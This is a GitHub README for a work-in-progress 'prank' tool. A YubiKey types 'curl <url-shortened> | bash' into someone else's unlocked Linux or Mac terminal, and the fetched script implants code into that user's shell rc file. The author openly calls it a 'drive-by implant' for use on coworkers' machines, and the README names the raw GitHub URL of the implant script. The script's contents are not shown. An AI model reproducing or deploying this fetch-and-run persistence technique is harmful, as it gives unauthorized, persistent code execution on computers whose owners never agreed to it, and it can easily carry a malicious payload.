# unlocked-prank
A harmless prank for those poor buggers who leave their Linux or Mac machines unlocked.

** not yet finished, just here as a work in progress **

## Use

I wrote this as a quick drive-by implant.  

Those around me often leave their systems unlocked.  Messing around manually is time consuming and thus risky.

As I have a spare Yubikey I decided to utilise a slot with a static string.  This has a single stored command of:

` curl <url-shortened> | bash`

The URL shortener is used as the Yubikey has a limit of 64 characters in it's static password mode.  The shortened URL should point to

`https://raw.githubusercontent.com/auraltension/unlocked-prank/master/implant.sh`

Open a shell, plug in, press the button, remove, walk away.  The script will determine whether the system is Mac or
linux, and then the shell used by the user and implant a fun prank into their shell rc.

For your piece of mind I recommend checking my implant.sh, and probably forking and using your own copy as you probably don't want to trust my script being executed on other peoples machines.
